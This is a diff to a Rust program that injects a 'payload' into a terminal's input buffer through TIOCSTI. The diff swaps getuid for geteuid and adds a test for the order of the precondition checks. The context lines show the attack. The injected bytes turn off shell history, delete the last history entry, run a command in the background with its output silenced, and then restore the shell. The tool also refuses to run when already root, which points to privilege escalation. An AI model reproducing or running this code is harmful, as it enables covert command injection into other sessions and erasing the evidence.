@@ -12,7 +12,7 @@ use std::time::Duration;
 use std::{env, fs, thread};
 
 use anyhow::Context as _;
-use libc::{SIGSTOP, STDIN_FILENO, TIOCSTI, c_int, getppid, getuid, ioctl, kill, pid_t, uid_t};
+use libc::{SIGSTOP, STDIN_FILENO, TIOCSTI, c_int, geteuid, getppid, ioctl, kill, pid_t, uid_t};
 
 /// First part of the payload to inject into the tty's input buffer.
 const START: &[u8] = b" exec 2>&-;set +o history\nhistory -d-1\n({ ";
@@ -29,8 +29,8 @@ const END: &[u8] = b";}>/dev/null 2>/dev/null &);set -o history;exec 2>&0;fg\n";
 pub fn run() -> anyhow::Result<()> {
     // Check that stdin refers to a terminal, that we are not already root, and that we have a valid parent.
     let is_tty = io::stdin().is_terminal();
-    // SAFETY: getuid() is safe to call in this context
-    let uid = unsafe { getuid() };
+    // SAFETY: geteuid() is safe to call in this context
+    let uid = unsafe { geteuid() };
     // SAFETY: getppid() is safe to call in this context
     let parent_pid = unsafe { getppid() };
     check_preconditions(uid, is_tty, parent_pid)?;
@@ -216,6 +216,17 @@ mod tests {
         let result = check_preconditions(1000, true, 100);
 
         assert!(result.is_ok(), "expected valid state to pass the checks");
+    }
+
+    #[test]
+    fn check_preconditions_checks_tty_before_root() {
+        let err = check_preconditions(0, false, 100).expect_err("expected an error");
+
+        assert!(
+            err.to_string()
+                .contains("stdin does not refer to a terminal"),
+            "expected the tty check to run before the root check, got: {err}"
+        );
     }
 
     #[test]
